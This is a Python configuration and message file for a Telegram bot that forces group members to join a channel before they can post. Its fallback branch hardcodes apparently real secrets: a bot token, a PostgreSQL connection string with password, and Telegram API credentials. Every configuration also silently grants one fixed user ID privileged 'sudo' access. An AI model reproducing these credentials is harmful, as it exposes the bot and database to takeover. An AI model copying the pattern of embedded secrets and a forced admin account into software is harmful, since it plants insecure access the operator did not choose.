import os

class Config():
  ENV = bool(os.environ.get('ENV', False))
  if ENV:
    BOT_TOKEN = os.environ.get("BOT_TOKEN", None)
    DATABASE_URL = os.environ.get("DATABASE_URL", None)
    APP_ID = os.environ.get("APP_ID", 6)
    API_HASH = os.environ.get("API_HASH", None)
    SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS").split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))
  else:
    BOT_TOKEN = "1638314908:AAHfBW0ROT_iTzlxIGTkoHwQlZCrUnGpY9w"
    DATABASE_URL = "postgres://wuyxuwnbeujmfv:e1363a141b2693d994365b4bab12fa81e5eadad888f1c441b20287fcfdc08662@ec2-3-211-37-117.compute-1.amazonaws.com:5432/d8ps1oilhra5q9"
    APP_ID = "3221794"
    API_HASH = "29b7bbc17a1510b19f8c05fa6d805dfc"
    SUDO_USERS = list(set(int(x) for x in ''.split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))


class Messages():
      HELP_MSG = [
        ".",

        "**Force Subscribe**\n**Force group members to join a specific channel before sending messages in the group.\nI will mute members if they not joined your channel and tell them to join the channel and unmute themself by pressing a button.**",
        
        "**Setup**\n**First of all add me in the group as admin with ban users permission and in the channel as admin.\nNote: Only creator of the group can setup me and i will leave the chat if i am not an admin in the chat.**",
        
        "**Commmands**\n**/ForceSubscribe - To get the current settings.\n/ForceSubscribe no/off/disable - To turn of ForceSubscribe.\n/ForceSubscribe {channel username} - To turn on and setup the channel.\n/ForceSubscribe clear - To unmute all members who muted by me.\n\nNote: /FSub is an alias of /ForceSubscribe**",
        
        "**⭕️ My Name :  𝗙𝗢𝗥𝗖𝗘 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗕𝗘 𝗕𝗢𝗧**\n\n**⭕️ Creater : 𝐄𝐧𝐭𝐜𝐥𝐚𝐬𝐬 𝐓𝐞𝐜𝐡 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧**\n\n**⭕️ Language :** `Python3`\n\n**⭕️ Library :** **Pyrogram Asyncio 0.16.1**\n\n**⭕️ Source Code : 👉** [HIDDEN](https://t.me/--...)"
      ]

      START_MSG = "**Hello [{}](tg://user?id={}) 👋,**\n**I Can Force Members To Join A Specific Channel\nBefore Writing Messages In The Group. Learn More By Clicking /help**"
